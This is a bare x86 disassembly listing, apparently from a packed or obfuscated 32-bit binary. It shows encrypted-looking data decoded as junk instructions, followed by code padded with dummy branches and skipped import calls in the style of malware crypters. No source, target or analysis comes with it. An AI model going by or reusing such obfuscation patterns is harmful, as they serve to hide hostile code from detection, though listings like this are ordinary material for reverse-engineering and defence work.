  41f03b:	clc    
  41f03c:	inc    edi
  41f03d:	je     0x41f0bc
  41f03f:	jg     0x41f00d
  41f041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f043:	fldenv [ebx-0x17477af]
  41f049:	aas    
  41f04a:	out    dx,eax
  41f04b:	ret    
  41f04c:	dec    edx
  41f04d:	mov    esi,0x1dd54b4
  41f052:	imul   eax,DWORD PTR [ecx-0x7d],0xbb265448
  41f059:	jg     0x41f07a
  41f05b:	in     eax,0x57
  41f05d:	add    edi,esp
  41f05f:	gs clc 
  41f061:	add    DWORD PTR [edi],esp
  41f063:	dec    DWORD PTR es:[ebp-0x36641004]
  41f06a:	mov    ecx,0xa52147da
  41f06f:	lahf   
  41f070:	sbb    eax,0x18c7801c
  41f075:	or     bl,BYTE PTR [edi+eax*8+0x69]
  41f079:	add    eax,0xc2f31425
  41f07e:	push   eax
  41f07f:	xchg   esi,eax
  41f080:	inc    ebx
  41f081:	sub    DWORD PTR [ebp+0x6d],0x50c8c08c
  41f088:	cdq    
  41f089:	push   edx
  41f08a:	and    ah,BYTE PTR [edi+0x23]
  41f08d:	mov    DWORD PTR [esi+0x43],esp
  41f090:	out    0x2,eax
  41f092:	mov    dl,0x72
  41f094:	push   0xd53730d0
  41f099:	inc    esi
  41f09a:	sbb    ebp,DWORD PTR [esi+0x48]
  41f09d:	pop    esp
  41f09e:	xor    eax,0x79a2921e
  41f0a3:	repnz dec esi
  41f0a5:	cmp    DWORD PTR [ebx-0x75e19b8a],edi
  41f0ab:	fsub   QWORD PTR [edx-0x37f3f989]
  41f0b1:	mov    esi,0x3ad15ac3
  41f0b6:	inc    ebx
  41f0b7:	mov    edi,db3
  41f0ba:	in     al,dx
  41f0bb:	sbb    al,0x34
  41f0bd:	clc    
  41f0be:	fld    DWORD PTR [ecx+0x337ed187]
  41f0c4:	gs std 
  41f0c6:	jecxz  0x41f104
  41f0c8:	mov    edx,0xecdb4c7b
  41f0cd:	sub    DWORD PTR [eax+0x19],ebx
  41f0d0:	mov    al,0xaa
  41f0d2:	xor    al,0x4d
  41f0d4:	scas   eax,DWORD PTR es:[edi]
  41f0d5:	ja     0x41f065
  41f0d7:	sub    BYTE PTR [edi-0x7cba6313],cl
  41f0dd:	dec    ebx
  41f0de:	pop    edi
  41f0df:	add    DWORD PTR [eax+esi*8],ebp
  41f0e2:	push   ebx
  41f0e3:	cli    
  41f0e4:	rol    edx,1
  41f0e6:	out    dx,eax
  41f0e7:	mov    al,BYTE PTR [edi-0x65]
  41f0ea:	leave  
  41f0eb:	loop   0x41f164
  41f0ed:	pusha  
  41f0ee:	dec    esp
  41f0ef:	cld    
  41f0f0:	push   ecx
  41f0f1:	mov    edi,0xa58b7f89
  41f0f6:	stos   DWORD PTR es:[edi],eax
  41f0f7:	xchg   DWORD PTR [esi],edi
  41f0f9:	fs iret 
  41f0fb:	push   ss
  41f0fc:	xchg   DWORD PTR [ecx+0x6f19a4ad],edx
  41f102:	iret   
  41f103:	daa    
  41f104:	adc    ah,ah
  41f106:	sub    al,dh
  41f108:	push   cs
  41f109:	sbb    bh,ch
  41f10b:	scas   al,BYTE PTR es:[edi]
  41f10c:	sti    
  41f10d:	leave  
  41f10e:	int    0xbc
  41f110:	jb     0x41f18c
  41f112:	stc    
  41f113:	cld    
  41f114:	cmp    edx,DWORD PTR [ecx]
  41f116:	les    ecx,FWORD PTR [edi+0x1432b572]
  41f11c:	or     cl,BYTE PTR [edx]
  41f11e:	dec    ebp
  41f11f:	dec    esp
  41f120:	fdiv   QWORD PTR [esi+edx*1-0x1a6a5c70]
  41f127:	lock mov BYTE PTR [edx+edi*8-0x853c8b5],cl
  41f12f:	cmp    ebx,DWORD PTR [edi-0x7aee80e0]
  41f135:	jns    0x41f125
  41f137:	add    al,BYTE PTR [edx-0x1c]
  41f13a:	in     al,dx
  41f13b:	ds jmp 0xede5:0xc8d4929b
  41f143:	mov    dl,0x17
  41f145:	xchg   DWORD PTR [edi],ecx
  41f147:	xchg   BYTE PTR cs:[edi+0x172f423b],bl
  41f14e:	sti    
  41f14f:	xchg   edi,eax
  41f150:	push   ss
  41f151:	call   0xc3d3:0x716cafa2
  41f158:	test   eax,0x301d1512
  41f15d:	fild   DWORD PTR [esi]
  41f15f:	or     esi,eax
  41f161:	mov    eax,ds:0x7de43417
  41f166:	mov    al,0x9a
  41f168:	nop
  41f169:	mov    ecx,0xf59f8641
  41f16e:	leave  
  41f16f:	add    dh,BYTE PTR ds:0x5cd7177a
  41f175:	aam    0xfc
  41f177:	or     DWORD PTR [edx+0x7d],esp
  41f17a:	bound  eax,QWORD PTR [edi+edi*4+0xc6c6506]
  41f181:	mul    DWORD PTR [esi+0x260a05d0]
  41f187:	in     eax,0x31
  41f189:	push   esp
  41f18a:	pop    edx
  41f18b:	xchg   BYTE PTR [eax-0x1d],dl
  41f18e:	sbb    DWORD PTR [eax+edx*8+0x7a],edx
  41f192:	adc    al,0x13
  41f194:	shl    DWORD PTR [edi+0x69],cl
  41f197:	jns    0x41f202
  41f199:	pop    esi
  41f19a:	xor    DWORD PTR [eax+ebx*2],edx
  41f19d:	pop    eax
  41f19e:	cmc    
  41f19f:	mov    ?,edx
  41f1a1:	in     eax,0xa3
  41f1a3:	scas   eax,DWORD PTR es:[edi]
  41f1a4:	ret    
  41f1a5:	(bad)  
  41f1a6:	push   edi
  41f1a7:	ins    DWORD PTR es:[edi],dx
  41f1a8:	leave  
  41f1a9:	jno    0x41f1cb
  41f1ab:	lea    eax,[edx+0x6b32bc39]
  41f1b1:	fwait
  41f1b2:	pusha  
  41f1b3:	dec    esp
  41f1b4:	xchg   ch,cl
  41f1b6:	push   0x65
  41f1b8:	and    esp,DWORD PTR [ebx+0x3999d187]
  41f1be:	in     eax,dx
  41f1bf:	in     eax,0x82
  41f1c1:	call   0x43f8:0xfc96406d
  41f1c8:	sbb    DWORD PTR [ebx+0x1b],0x1d2799ca
  41f1cf:	and    BYTE PTR [eax+eiz*4],0xff
  41f1d3:	sub    al,BYTE PTR [edx-0x7758bd0b]
  41f1d9:	or     al,0xad
  41f1db:	cld    
  41f1dc:	outs   dx,DWORD PTR ds:[esi]
  41f1dd:	(bad)  
  41f1de:	(bad)  
  41f1e0:	sbb    bh,bh
  41f1e2:	aad    0xc
  41f1e4:	inc    edx
  41f1e5:	outs   dx,DWORD PTR ds:[esi]
  41f1e6:	in     al,dx
  41f1e7:	mov    DWORD PTR [edi],esi
  41f1e9:	mov    WORD PTR [edx],gs
  41f1eb:	mov    ds:0xb09103f4,al
  41f1f0:	addr16 (bad) 
  41f1f2:	aaa    
  41f1f3:	push   ss
  41f1f4:	cdq    
  41f1f5:	mov    dl,0x5f
  41f1f7:	popa   
  41f1f8:	sbb    DWORD PTR [eax],ecx
  41f1fa:	xchg   ebp,eax
  41f1fb:	dec    edx
  41f1fc:	inc    edi
  41f1fd:	sbb    BYTE PTR [ecx-0x3b00117b],ch
  41f203:	ss xchg esi,eax
  41f205:	jo     0x41f1b1
  41f207:	aam    0x2c
  41f209:	lea    eax,[ebp+0x4a]
  41f20c:	dec    ebp
  41f20d:	pushf  
  41f20e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20f:	pushf  
  41f210:	jnp    0x41f267
  41f212:	cld    
  41f213:	add    al,0x4e
  41f215:	and    dl,BYTE PTR [ebx+0x71]
  41f218:	into   
  41f219:	add    bl,BYTE PTR [ecx+0x2e]
  41f21c:	scas   al,BYTE PTR es:[edi]
  41f21d:	xor    ebp,ebp
  41f21f:	add    eax,0x319bb0cd
  41f224:	lds    edi,FWORD PTR [esi-0x69d90d07]
  41f22a:	out    dx,eax
  41f22b:	ret    
  41f22c:	inc    edx
  41f22d:	pop    ss
  41f22e:	sub    esi,DWORD PTR [esi+0x7e]
  41f231:	bswap  ebp
  41f233:	xchg   edx,eax
  41f234:	xchg   edi,eax
  41f235:	adc    BYTE PTR [eax],dl
  41f237:	scas   eax,DWORD PTR es:[edi]
  41f238:	arpl   bx,si
  41f23a:	xchg   dh,ch
  41f23c:	and    eax,0x54e9f6fc
  41f241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f242:	add    al,0x6f
  41f244:	pop    esp
  41f245:	aaa    
  41f246:	jb     0x41f1f7
  41f248:	dec    edx
  41f249:	mov    edx,0x911b919
  41f24e:	mov    ebx,0xee2f4719
  41f253:	lahf   
  41f254:	ja     0x41f2ba
  41f256:	je     0x41f2a9
  41f258:	cdq    
  41f259:	das    
  41f25a:	xor    al,0x20
  41f25c:	push   ss
  41f25d:	clc    
  41f25e:	in     eax,dx
  41f25f:	lock xor al,BYTE PTR ss:[ecx+ecx*8]
  41f264:	mov    ah,cl
  41f266:	jl     0x41f242
  41f268:	ja     0x41f1fe
  41f26a:	ret    
  41f26b:	ss xchg cl,dh
  41f26e:	mov    dh,dh
  41f270:	dec    eax
  41f271:	shr    ah,0x3c
  41f274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f275:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f277:	push   DWORD PTR [edx-0x442f1394]
  41f27d:	icebp  
  41f27e:	dec    ecx
  41f27f:	jp     0x41f2f8
  41f281:	cli    
  41f282:	fadd   DWORD PTR ds:0xc03f3ca5
  41f288:	(bad)  
  41f289:	cmp    eax,0xed929961
  41f28e:	mov    WORD PTR es:0x2a2c4d07,ds
  41f295:	test   eax,0xf36e3efe
  41f29a:	(bad)  
  41f29b:	in     al,0x90
  41f29d:	rcl    DWORD PTR [ecx+0x3aa19d50],cl
  41f2a3:	jmp    0x60c4096f
  41f2a8:	ds (bad) 
  41f2aa:	mov    ebx,0xf5fdf57
  41f2af:	hlt    
  41f2b0:	stc    
  41f2b1:	dec    ecx
  41f2b2:	xchg   ebx,eax
  41f2b3:	mov    ch,ah
  41f2b5:	leave  
  41f2b6:	jne    0x41f30a
  41f2b8:	mov    ds:0x7d21c984,al
  41f2bd:	pop    eax
  41f2be:	scas   eax,DWORD PTR es:[edi]
  41f2bf:	mov    eax,0xac2564e2
  41f2c4:	mov    al,ds:0x77fc017d
  41f2c9:	mov    al,0x89
  41f2cb:	sar    BYTE PTR [esi-0x48],0x4b
  41f2cf:	repnz xlat BYTE PTR ds:[ebx]
  41f2d1:	lds    edx,FWORD PTR [edi-0x42]
  41f2d4:	dec    eax
  41f2d5:	mov    ecx,0x77675a8c
  41f2da:	jmp    0x41f31e
  41f2dc:	adc    dh,BYTE PTR [eax]
  41f2de:	clc    
  41f2df:	(bad)  
  41f2e0:	mov    ah,cl
  41f2e2:	mov    edi,0xc7754feb
  41f2e7:	jmp    0xe4adcfa
  41f2ec:	pop    eax
  41f2ed:	fdiv   st(3),st
  41f2ef:	dec    ebp
  41f2f0:	and    al,0xdc
  41f2f2:	mov    dh,cl
  41f2f4:	pop    es
  41f2f5:	stos   BYTE PTR es:[edi],al
  41f2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2f7:	pop    ebx
  41f2f8:	dec    esi
  41f2fa:	dec    edx
  41f2fb:	or     DWORD PTR [esp+ebp*8],ebp
  41f2fe:	scas   eax,DWORD PTR es:[edi]
  41f2ff:	retf   
  41f300:	mov    ch,0x63
  41f302:	pushf  
  41f303:	sub    BYTE PTR [edx],0x7e
  41f306:	dec    esi
  41f307:	mov    ebx,0x45a3fa42
  41f30c:	xlat   BYTE PTR ds:[ebx]
  41f30d:	adc    esp,DWORD PTR [edx+eiz*4+0x34]
  41f311:	retf   0xe30a
  41f314:	jge    0x41f317
  41f316:	lahf   
  41f317:	imul   ecx,DWORD PTR [ebx+0xf],0x5fbbafb7
  41f31e:	cdq    
  41f31f:	or     edx,ebx
  41f321:	jnp    0x41f2fe
  41f323:	addr16 pop ebx
  41f325:	rol    BYTE PTR [ecx],cl
  41f327:	mov    edx,0xe93107c5
  41f32c:	mov    eax,0x551691c7
  41f331:	(bad)  
  41f333:	jnp    0x41f377
  41f335:	adc    BYTE PTR [edi+0x3b],dh
  41f338:	dec    edx
  41f339:	and    al,0x65
  41f33b:	arpl   WORD PTR [edi+0x2dbc9689],di
  41f341:	xchg   edx,eax
  41f342:	cmp    eax,0xb444214f
  41f347:	or     ch,bh
  41f349:	es es das 
  41f34c:	mov    esi,0x1ae2914e
  41f351:	xor    DWORD PTR [edi+0xe598b86],eax
  41f357:	push   ss
  41f358:	xchg   edi,esi
  41f35a:	ret    
  41f35b:	xor    DWORD PTR [eax+ebp*4+0x2c1adf81],eax
  41f362:	imul   edi,DWORD PTR [eax],0x3de0ede5
  41f368:	add    edi,0x6f899045
  41f36e:	add    BYTE PTR [eax],al
  41f370:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42820f
  41f37e:	mov    ecx,DWORD PTR ds:0x428257
  41f384:	mov    ecx,DWORD PTR ds:0x428243
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42822f,ebx
  41f397:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428103
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e00
  41f3c7:	sub    ecx,DWORD PTR ds:0x428227
  41f3cd:	mov    DWORD PTR ds:0x428177,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282d3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282eb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42817f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428307,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42815f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42836b,0x0
  41f428:	mov    DWORD PTR ds:0x4282ff,0xae0
  41f432:	mov    DWORD PTR ds:0x42813b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42835b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282e3,ebx
  41f449:	mov    DWORD PTR ds:0x42815f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42836b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f15
  41f468:	call   DWORD PTR ds:0x428e84
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428377
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428177,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282cf,0x6486
  41f49d:	mov    DWORD PTR ds:0x42823b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42826b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428373,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428177,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427fdb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e04
  41f4d7:	neg    DWORD PTR ds:0x42816b
  41f4dd:	and    DWORD PTR ds:0x42824f,0x4282d3
  41f4e7:	and    DWORD PTR ds:0x42834f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428167
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282ef
  41f4fa:	mov    DWORD PTR ds:0x428167,edx
  41f500:	sub    DWORD PTR ds:0x428263,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42816f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428373,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428153,0x0
  41f53b:	mov    DWORD PTR ds:0x42836f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42822f,0x6044
  41f55b:	not    DWORD PTR ds:0x42823b
  41f561:	cmp    DWORD PTR ds:0x428153,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e08
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428133,edi
  41f5a3:	and    DWORD PTR ds:0x4282cb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282e3
  41f5b0:	add    edx,DWORD PTR ds:0x4282db
  41f5b6:	mov    DWORD PTR ds:0x4282e3,edx
  41f5bc:	add    DWORD PTR ds:0x4282d7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42823b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42836f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42817b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x4282ff,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282ef,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428373,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428237,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42824b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428267,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428233
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42827f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42824b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e0c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42820b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282d7
  41f67a:	add    DWORD PTR ds:0x4282fb,ecx
  41f680:	sbb    DWORD PTR ds:0x42826f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428143
  41f68c:	adc    DWORD PTR ds:0x428137,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42839f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42822f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428303,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282ef,0x6375
  41f6ef:	not    DWORD PTR ds:0x42814f
  41f6f5:	mov    DWORD PTR ds:0x42820b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42821b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42825f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42824b
  41f727:	call   DWORD PTR ds:0x428e10
  41f72d:	movzx  ecx,WORD PTR ds:0x42821b
  41f734:	xor    DWORD PTR ds:0x428387,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42824b
  41f740:	add    ecx,DWORD PTR ds:0x428243
  41f746:	mov    DWORD PTR ds:0x42824b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42825b
  41f752:	adc    DWORD PTR ds:0x42836b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428307,ebx
  41f75f:	sub    DWORD PTR ds:0x428167,edx
  41f765:	and    DWORD PTR ds:0x4282e7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x4282fb,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428367,0x4282db
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428217,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428227
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42821b,0x428177
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428367,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428267
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428373,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428357
  41f7d9:	mov    DWORD PTR ds:0x42834b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282ef,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42826f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428167,edi
  41f7fe:	cmp    DWORD PTR ds:0x428373,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f5a
  41f813:	push   0x427ec1
  41f818:	call   DWORD PTR ds:0x428e88
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42839b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428257,ecx
  41f830:	adc    DWORD PTR ds:0x42813f,edi
  41f836:	and    DWORD PTR ds:0x42837f,0x3101
  41f840:	mov    DWORD PTR ds:0x428387,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42814f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42823f
  41f857:	mov    DWORD PTR ds:0x42822b,0x4504
  41f861:	mov    DWORD PTR ds:0x42835f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428383
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282ef,ebx
  41f87c:	cmp    DWORD PTR ds:0x42814f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f8c
  41f890:	push   0x427f96
  41f895:	call   DWORD PTR ds:0x428e8c
  41f89b:	and    DWORD PTR ds:0x428167,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282ef,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428383
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428157,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428247,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42835b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428143,0x42837f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428257
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42820f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282e3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428173,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42827f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428e90
  41f979:	sbb    DWORD PTR ds:0x428383,0x209
  41f983:	xor    DWORD PTR ds:0x428373,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42826f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428173
  41f9bf:	or     DWORD PTR ds:0x42835f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282d7,0x0
  41f9d1:	mov    DWORD PTR ds:0x42821b,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282d3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282db
  41f9f0:	cmp    DWORD PTR ds:0x4282d7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e14
  41fa08:	adc    DWORD PTR ds:0x42836f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x4282f3,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42834b
  41fa1b:	add    DWORD PTR ds:0x42835b,ecx
  41fa21:	add    DWORD PTR ds:0x428353,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282d3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42827f
  41fa3b:	and    DWORD PTR ds:0x42813f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42822b,0x42816b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428273,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428257,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282e7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428177
  41fa8d:	mov    DWORD PTR ds:0x42816f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428257,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428063
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e18
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428133
  41fabc:	sbb    ecx,DWORD PTR ds:0x42822b
  41fac2:	mov    DWORD PTR ds:0x428133,ecx
  41fac8:	xor    DWORD PTR ds:0x42827b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428233
  41fad5:	or     DWORD PTR ds:0x4282cb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42835b
  41fae3:	add    DWORD PTR ds:0x42826f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42814b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42817b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282df
  41fb06:	mov    DWORD PTR ds:0x428363,edx
  41fb0c:	mov    DWORD PTR ds:0x42813f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282e7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42817b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e1c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428383
  41fb48:	or     ecx,DWORD PTR ds:0x428253
  41fb4e:	mov    DWORD PTR ds:0x428383,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42814b
  41fb5a:	add    ecx,DWORD PTR ds:0x428383
  41fb60:	mov    DWORD PTR ds:0x42814b,ecx
